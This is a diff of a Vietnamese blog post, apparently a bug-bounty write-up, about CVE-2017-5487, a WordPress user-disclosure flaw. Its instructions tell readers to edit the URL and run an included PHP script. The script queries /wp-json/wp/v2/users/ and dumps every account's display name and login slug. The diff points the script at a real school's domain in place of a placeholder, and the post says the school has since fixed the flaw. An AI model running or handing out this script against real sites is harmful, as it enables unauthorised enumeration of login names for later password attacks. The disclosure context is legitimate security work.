@@ -1,30 +1,38 @@
 ---
-title: Tiết lộ Người Dùng WordPress
-date: 23/06/2021
+title: Tiền thưởng Tiết Lộ Người Dùng WordPress (CVE-2017-5487)
+date: 25/03/2022
 layout: single
 header:
   teaser: /assets/images/wordpress.png
---- 
+---
 
+## Mô Tả
 
-## Mô Tả 
-Tiết lộ các tài khoản WordPress thông qua `/wp-json/wp/v2/users/` sử dụng php để dump tên tài khoản, và họ tên đăng bài 
+Tiết lộ các tài khoản WordPress thông qua `/wp-json/wp/v2/users/` sử dụng php để dump tên tài khoản, và họ tên đăng bài
 
+Việc tiết lộ thông tin nhạy cảm cho CVE-2017-5487
 
+wp-gồm/rest-api/endpoints/class-wp-rest-users-controller.php trong quá trình triển khai API REST trong WordPress 4.7 trước 4.7.1 không đúng cách hạn chế danh sách tác giả bài đăng, điều này cho phép kẻ tấn công từ xa lấy được thông tin nhạy cảm thông qua yêu cầu wp-json/wp/v2/users.
+
+Điểm cơ bản: 5,3 TRUNG BÌNH
 
 ## Hướng dẫn
-Thay đổi url trong đoạn code dưới đây 
-```shell 
+
+Thay đổi url trong đoạn code dưới đây
+
+```shell
 php file.php
 ```
-[![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/  )
+
+[![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/)
+
 ```php
 #!usr/bin/php
 <?php
 header ('Content-type: text/html; charset=UTF-8');
 
 
-$url= "http://tagert"; # url 
+$url= "https://namsaigon.edu.vn/"; # url
 $payload="/wp-json/wp/v2/users/";
 $urli = file_get_contents($url.$payload);
 $json = json_decode($urli, true);
@@ -35,15 +43,18 @@ foreach($json as $users){
     echo "[*] Name: |" .$users['name']   ."|\n";
     echo "[*] User :|" .$users['slug']   ."|\n";
     echo "\n";
-}echo "*-----------------------------*";} 
+}echo "*-----------------------------*";}
 else{echo "[*] No user";}
 
 
 ?>
 
 ```
+
 ![](https://www8.0zz0.com/2021/07/15/15/128822449.jpg)
 
+## Kết quả
 
-## Chúc may mắn :D
+Lỗ hổng đã được xác nhận qua mail của trường và đã được Fix
 
+![](https://www5.0zz0.com/2023/03/15/10/222638956.png)
